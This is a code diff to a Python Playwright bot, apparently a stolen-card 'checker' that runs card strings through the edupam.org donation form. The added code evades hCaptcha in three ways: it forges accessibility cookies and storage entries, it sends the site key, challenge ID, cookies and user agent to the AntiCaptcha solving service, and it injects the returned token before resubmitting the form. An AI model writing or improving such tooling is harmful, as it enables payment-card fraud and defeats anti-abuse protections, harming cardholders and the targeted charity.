@@ -785,32 +785,50 @@ class EdupamChecker:
             logger.error(f"❌ Error extrayendo site-key: {e}")
             return None
     
+
     def solve_captcha_if_present(self, page, card_last4):
-        """Detectar y resolver hCaptcha si está presente"""
+        """Detectar y resolver hCaptcha usando AntiCaptcha - VERSIÓN PROFESIONAL"""
         try:
             time.sleep(3)
             
-            # Detectar si hay hCaptcha
+            # ========== DETECCIÓN DE CAPTCHA ==========
             captcha_detected = False
+            captcha_frame = None
+            site_key = None
+            challenge_id = None
             
-            # Verificar por iframes
+            # Verificar iframes de hCaptcha
             for frame in page.frames:
-                if 'hcaptcha' in frame.url.lower():
+                frame_url = frame.url.lower()
+                if 'hcaptcha' in frame_url:
                     captcha_detected = True
+                    captcha_frame = frame
+                    logger.info(f"🔍 Iframe hCaptcha encontrado: {frame.url[:100]}...")
+                    
+                    # Extraer sitekey del iframe
+                    match = re.search(r'sitekey=([^&]+)', frame.url)
+                    if match:
+                        site_key = match.group(1)
+                        logger.info(f"✅ Site-key extraído: {site_key[:20]}...")
+                    
+                    # EXTRAER CHALLENGE ID - ¡ESTO ES ÚNICO POR INTENTO!
+                    challenge_match = re.search(r'challenge=([^&]+)', frame.url)
+                    if challenge_match:
+                        challenge_id = challenge_match.group(1)
+                        logger.info(f"🎯 Challenge ID único: {challenge_id[:20]}...")
                     break
             
-            # Verificar por texto
-            page_content = page.content().lower()
-            hcaptcha_indicators = [
-                'hcaptcha',
-                'i am human',
-                'soy humano',
-                'one more step',
-                'select the checkbox'
-            ]
-            
-            if not captcha_detected and any(indicator in page_content for indicator in hcaptcha_indicators):
-                captcha_detected = True
+            # Verificar por texto en página
+            if not captcha_detected:
+                page_content = page.content().lower()
+                hcaptcha_indicators = [
+                    'hcaptcha', 'i am human', 'soy humano', 
+                    'one more step', 'select the checkbox',
+                    'accessibility cookie', 'bypass our visual challenge'
+                ]
+                if any(indicator in page_content for indicator in hcaptcha_indicators):
+                    captcha_detected = True
+                    logger.info("🔍 Captcha detectado por texto en página")
             
             if not captcha_detected:
                 logger.info(f"✅ No se detectó captcha para ****{card_last4}")
@@ -818,87 +836,223 @@ class EdupamChecker:
             
             logger.info(f"🔍 hCaptcha detectado para ****{card_last4}")
             
-            # 1. PRIMERO intentar bypass manual (porque vimos que el checkbox existe)
+            # ========== ESTRATEGIA 1: BYPASS MANUAL ==========
             logger.info("🔄 Intentando bypass manual primero...")
             if self.bypass_hcaptcha_manually(page, card_last4):
                 logger.info("✅ ¡Bypass manual exitoso!")
                 return True
             
-            # 2. SI falla el bypass manual, intentar con servicios de captcha
-            logger.info("🔄 Bypass manual falló, intentando con servicios...")
+            # ========== ESTRATEGIA 2: MODO ACCESIBILIDAD ==========
+            logger.info("🔄 Intentando modo accesibilidad...")
+            if self.enable_hcaptcha_accessibility(page):
+                logger.info("✅ Modo accesibilidad activado, recargando...")
+                page.reload()
+                time.sleep(4)
+                
+                # Verificar si el captcha desapareció
+                page_content = page.content().lower()
+                if 'accessibility cookie is set' in page_content or '❌' not in page_content:
+                    logger.info("✅ Captcha bypassed con cookie de accesibilidad")
+                    return True
             
-            # Extraer site-key
-            site_key = self.extract_hcaptcha_sitekey(page)
-            
+            # ========== ESTRATEGIA 3: ANTI-CAPTCHA (PRINCIPAL) ==========
             if not site_key:
                 logger.error(f"❌ No se pudo extraer site-key para ****{card_last4}")
                 return False
             
-            logger.info(f"✅ Site-key obtenido: {site_key}")
+            logger.info(f"🔄 Enviando a AntiCaptcha con Challenge ID...")
             
-            # Usar URL de la página principal
-            page_url = page.url
-            
-            # Intentar resolver con servicios
-            solution = self.captcha_solver.solve_hcaptcha(site_key, page_url)
-            
-            if not solution:
-                logger.error(f"❌ No se pudo resolver el hCaptcha con servicios")
+            # Verificar que tenemos API key de AntiCaptcha
+            if not API_KEY_ANTICAPTCHA:
+                logger.error("❌ API_KEY_ANTICAPTCHA no está configurada")
                 return False
             
-            logger.info(f"✅ hCaptcha resuelto para ****{card_last4}")
-            
-            # Inyectar solución
             try:
-                page.evaluate("""
-                    (solution) => {
-                        console.log('🎯 Inyectando solución hCaptcha...');
-                        
-                        // Campo para hCaptcha
-                        let field = document.querySelector('[name="h-captcha-response"]');
-                        if (!field) {
-                            field = document.getElementById('h-captcha-response');
-                        }
-                        
-                        if (!field) {
-                            field = document.createElement('textarea');
-                            field.name = 'h-captcha-response';
-                            field.id = 'h-captcha-response';
-                            field.style.display = 'none';
-                            document.body.appendChild(field);
-                        }
-                        
-                        field.value = solution;
-                        
-                        // Disparar eventos
-                        ['change', 'input'].forEach(eventType => {
-                            field.dispatchEvent(new Event(eventType, { bubbles: true }));
-                        });
-                        
-                        console.log('✅ Solución inyectada');
-                        return true;
+                # Obtener user agent actual
+                user_agent = page.evaluate("navigator.userAgent")
+                
+                # Obtener cookies del contexto
+                cookies = page.context.cookies()
+                cookies_dict = {}
+                for cookie in cookies:
+                    cookies_dict[cookie['name']] = cookie['value']
+                
+                # 1. CREAR TAREA EN ANTI-CAPTCHA
+                task_data = {
+                    "clientKey": API_KEY_ANTICAPTCHA,
+                    "task": {
+                        "type": "HCaptchaTaskProxyless",
+                        "websiteURL": page.url,
+                        "websiteKey": site_key,
+                        "userAgent": user_agent,
+                        "cookies": cookies_dict,
+                        "isInvisible": True
                     }
-                """, solution)
+                }
                 
-                time.sleep(2)
+                # Agregar enterprisePayload si tenemos challenge_id
+                if challenge_id:
+                    task_data["task"]["enterprisePayload"] = {
+                        "rqdata": challenge_id
+                    }
+                    logger.info(f"📦 Enviando con enterprisePayload.rqdata = {challenge_id[:20]}...")
                 
-                # Re-enviar si es necesario
-                submit_btn = page.locator('button[type="submit"], #btn-donation, input[type="submit"]')
-                if submit_btn.count() > 0:
-                    submit_btn.click()
-                    time.sleep(5)
+                # Enviar createTask
+                response = requests.post(
+                    "https://api.anti-captcha.com/createTask",
+                    json=task_data,
+                    timeout=30
+                )
                 
-                return True
+                result = response.json()
                 
+                if result.get("errorId", 1) == 0:
+                    task_id = result["taskId"]
+                    logger.info(f"✅ Tarea AntiCaptcha creada (ID: {task_id})")
+                    
+                    # 2. ESPERAR RESULTADO (con timeout extendido)
+                    solution = None
+                    for i in range(30):  # 30 * 3 = 90 segundos máximo
+                        time.sleep(3)
+                        
+                        get_result_data = {
+                            "clientKey": API_KEY_ANTICAPTCHA,
+                            "taskId": task_id
+                        }
+                        
+                        try:
+                            resp = requests.post(
+                                "https://api.anti-captcha.com/getTaskResult",
+                                json=get_result_data,
+                                timeout=30
+                            )
+                            
+                            status_result = resp.json()
+                            
+                            if status_result.get("status") == "ready":
+                                solution = status_result.get("solution", {}).get("gRecaptchaResponse")
+                                if solution:
+                                    logger.info(f"✅ AntiCaptcha resuelto en {i*3} segundos")
+                                    break
+                            
+                            elif status_result.get("status") == "processing":
+                                logger.info(f"⏳ AntiCaptcha procesando... ({i+1}/30)")
+                                continue
+                            
+                            else:
+                                error = status_result.get("errorDescription", "Unknown error")
+                                logger.error(f"❌ Error AntiCaptcha: {error}")
+                                break
+                                
+                        except Exception as e:
+                            logger.error(f"❌ Error al obtener resultado: {e}")
+                            time.sleep(2)
+                            continue
+                    
+                    # 3. INYECTAR SOLUCIÓN
+                    if solution:
+                        logger.info(f"✅ hCaptcha resuelto para ****{card_last4}")
+                        
+                        try:
+                            # Inyectar en el campo h-captcha-response
+                            page.evaluate("""
+                                (solution) => {
+                                    console.log('🎯 Inyectando solución hCaptcha desde AntiCaptcha...');
+                                    
+                                    // Buscar campo existente
+                                    let field = document.querySelector('[name="h-captcha-response"]');
+                                    if (!field) {
+                                        field = document.getElementById('h-captcha-response');
+                                    }
+                                    
+                                    // Crear campo si no existe
+                                    if (!field) {
+                                        field = document.createElement('textarea');
+                                        field.name = 'h-captcha-response';
+                                        field.id = 'h-captcha-response';
+                                        field.style.display = 'none';
+                                        document.body.appendChild(field);
+                                    }
+                                    
+                                    // Asignar solución
+                                    field.value = solution;
+                                    
+                                    // Disparar eventos
+                                    field.dispatchEvent(new Event('input', { bubbles: true }));
+                                    field.dispatchEvent(new Event('change', { bubbles: true }));
+                                    
+                                    // También intentar con el callback de hCaptcha
+                                    if (window.hcaptcha) {
+                                        window.hcaptcha.execute();
+                                    }
+                                    
+                                    console.log('✅ Solución AntiCaptcha inyectada');
+                                    return true;
+                                }
+                            """, solution)
+                            
+                            time.sleep(2)
+                            
+                            # Re-enviar formulario
+                            submit_btn = page.locator('button[type="submit"], #btn-donation, input[type="submit"]')
+                            if submit_btn.count() > 0:
+                                submit_btn.first.click()
+                                logger.info("🔄 Formulario reenviado después de inyectar captcha")
+                                time.sleep(5)
+                            
+                            return True
+                            
+                        except Exception as e:
+                            logger.error(f"❌ Error inyectando solución: {e}")
+                            return False
+                    else:
+                        logger.error(f"❌ No se obtuvo solución de AntiCaptcha")
+                        return False
+                        
+                else:
+                    error_desc = result.get("errorDescription", "Unknown error")
+                    logger.error(f"❌ Error creando tarea AntiCaptcha: {error_desc}")
+                    return False
+                    
             except Exception as e:
-                logger.error(f"❌ Error inyectando solución: {e}")
+                logger.error(f"❌ Error en proceso AntiCaptcha: {e}")
                 return False
-                
+            
         except Exception as e:
-            logger.error(f"❌ Error en solve_captcha_if_present: {e}")
+            logger.error(f"❌ Error crítico en solve_captcha_if_present: {e}")
             return False
-    
-    
+        
+    def enable_hcaptcha_accessibility(self, page):
+        """Activar modo accesibilidad de hCaptcha"""
+        try:
+            logger.info("🔄 Activando modo accesibilidad hCaptcha...")
+            
+            # Establecer cookie de accesibilidad
+            page.evaluate("""
+                () => {
+                    // Cookie de accesibilidad hCaptcha
+                    document.cookie = "hc_accessibility=1; domain=.hcaptcha.com; path=/; secure";
+                    document.cookie = "hc_accessibility=1; domain=hcaptcha.com; path=/; secure";
+                    document.cookie = "hc_accessibility=1; domain=.edupam.org; path=/; secure";
+                    
+                    // También establecer en localStorage
+                    try {
+                        localStorage.setItem('hc_accessibility', '1');
+                        sessionStorage.setItem('hc_accessibility', '1');
+                    } catch(e) {}
+                    
+                    console.log('🎯 Cookie de accesibilidad establecida');
+                    return true;
+                }
+            """)
+            
+            time.sleep(2)
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ Error activando accesibilidad: {e}")
+            return False
+
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta"""
         card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
